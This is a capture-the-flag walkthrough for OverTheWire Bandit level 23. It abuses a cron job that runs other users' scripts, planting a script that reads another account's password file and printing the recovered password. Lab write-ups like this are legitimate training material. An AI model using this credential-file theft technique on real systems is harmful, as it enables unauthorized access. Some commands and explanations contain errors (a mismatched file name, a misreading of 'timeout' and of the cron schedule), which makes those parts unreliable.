# Bandit Level 23

## Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

## Solution
First connect through secure shell using `bandit23` as username and the password found in level 22
`ssh bandit23@bandit.labs.overthewire.org -p 2220`

Enter password when prompted.

For this exercise all we need to do is check the `/etc/cron.d/` file as specified in the description in the Goal section.

For this we run the following command:

`ls /etc/cron.d/`

Output: 
```
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22       cronjob_bandit23       cronjob_bandit24       cronjob_bandit25_root  .placeholder
```

We can see there is a `cronjob_bandit24`. We inspect it by down the following:

`cat /etc/cron.d/cronjon_23`

Output:
```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
```
We see that this cronjob executes `cronjob_bandit24.sh` when the machine starts up.

We inspect the contents of this script as follow:

`cat /usr/bin/cronjob_bandit24.sh`

Ouput:
```bash
#!/bin/bash
myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

This script tells us that there is a directory named `bandit24` in `/var/spool/` directory and the cronjon looks for any file that is not a `.` or `..` and then it checks if the owner is `bandit23` and if it is then it times out for 60 seconds and then execute the script. After execution it removes the script from the directory.

In order to get the password we will need to write a script that will fetch the password for us as follow:

```
# create a directory to work with
mkdir -p /tmp/myself
cd /tmp/myself
# create a file that will hold our script
touch pass_fetch.sh
# change persmission so that everyone can execute
chmod 777 pass_fetch.sh
# create a file that will hold the password
touch fetched_password
# change permission so that everyone can write to the file
chmod 666 fetched_password
```

Finally, we write the script which is as follow:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/myself/fetched_password
```

We then copy the scrip into `/var/spool/bandit24` as follow:

`cp pass_fetch.sh /var/spool/bandit24`

finally we wait 60 seconds

`sleep 60`

after it finished the wait we check if the `fetched_password` file has the contents

`cat fetched_password`

Output: 
`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`